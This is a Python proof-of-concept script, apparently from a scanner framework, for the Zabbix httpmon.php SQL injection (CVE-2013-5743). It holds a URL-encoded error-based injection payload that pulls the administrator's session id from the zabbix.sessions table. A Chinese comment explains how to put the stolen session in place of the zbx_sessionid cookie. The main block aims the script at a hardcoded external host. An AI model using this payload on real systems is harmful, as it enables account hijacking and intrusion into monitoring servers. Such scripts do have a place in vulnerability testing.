#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..miniCurl import Curl
from ..t import T

"""
POC Name  :  Zabbix Httpmon.php SQL Injection
Reference :  http://wooyun.org/bugs/wooyun-2010-084877
Author    :  NoName
CVE-2013-5743(影响版本 1.8.5-1.8.9)
注入管理员session，用获取到的session替换cookie中zbx_sessionid中的值
"""

import  re


class P(T):
    def __init__(self):
        T.__init__(self)

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        arg='http://'+ip+':'+port
        curl=Curl()
        result = {}
        result['result']=False

        # /httpmon.php?applications=2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(md5('123'),0x7e,userid,0x7e,status) as char),0x7e)) from zabbix.sessions where status=0 and userid=1 LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
        payload = "/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%28select%20concat%28cast%28concat%28md5('123'),0x7e,userid,0x7e,status%29%20as%20char%29,0x7e%29%29%20from%20zabbix.sessions%20where%20status=0%20and%20userid=1%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29"
        code, head, res, errcode, _ = curl.curl(arg + payload)
        if code == 200:
            # md5(123)
            m = re.search("202cb962ac59075b964b07152d234b70",res)
            if m:
                output('zabbix httpmon.php sql injection exists.',result,'hole')
    
        del curl
        return result


def output(url,result,label):
    info = url + '  zabbix  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='zabbix Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/zabbix/zabbix_53dc8aab341adba743a9f15c80129dac.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/zabbix/zabbix_53dc8aab341adba743a9f15c80129dac.py
#/root/github/poccreate/codesrc/exp-303.py
